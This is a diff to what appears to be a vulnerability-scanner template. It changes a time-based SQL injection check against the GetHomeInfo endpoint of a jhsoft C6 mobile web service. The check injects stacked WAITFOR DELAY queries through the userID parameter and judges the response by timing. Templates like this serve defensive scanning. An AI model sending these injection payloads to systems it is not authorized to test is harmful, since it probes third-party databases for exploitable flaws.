@@ -9,18 +9,27 @@
 
 
 
-GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:7%27-- HTTP/1.1
+GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
 Host: {{Hostname}}
 User-Agent: {{random_ua}}
 
 
 #@ timeout: 20
 #@ condition: and
+#@ matcher: response_time >= 5
 #@ matcher: status_code == 200
-#@ matcher: response_time > 7
+
+---
+
+GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
 
 
 
-
-
-# @VEIL-STAMP: f6f0c5e3d2f129d0df7126fecaf28f0fdd73f322eb5687d728cb409dc9b56e1c
+# @VEIL-STAMP: 606d5e53e683b06c58d47cba3a921c37e4e8cf5cf16401db331c9b58f0b76477
